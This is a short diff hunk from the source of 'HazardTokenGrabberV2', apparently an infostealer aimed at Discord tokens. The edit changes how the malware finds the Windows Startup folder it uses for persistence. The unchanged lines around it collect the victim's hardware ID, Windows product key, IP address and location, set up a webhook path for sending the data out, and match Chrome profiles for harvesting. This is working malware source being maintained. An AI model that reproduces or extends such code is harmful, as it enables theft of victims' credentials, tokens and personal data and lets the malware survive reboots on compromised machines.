@@ -197,7 +197,7 @@ class HazardTokenGrabberV2(Functions):
         inf, net = self.system_info(), self.network_info()
         self.hwid, self.winver, self.winkey = inf[0], inf[1], inf[2]
         self.ip, self.city, self.country, self.region, self.org, self.loc, self.googlemap = net[0], net[1], net[2], net[3], net[4], net[5], net[6]
-        self.startup_loc = subprocess.check_output("[System.Environment]::GetFolderPath(7)").decode().rstrip()
+        self.startup_loc = ntpath.join(self.roaming, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
 
         self.hook_reg = "api/webhooks"
         self.chrome_reg = re.compile(r'^(profile\s\d*)|(default)|(guest profile)$', re.IGNORECASE | re.MULTILINE)
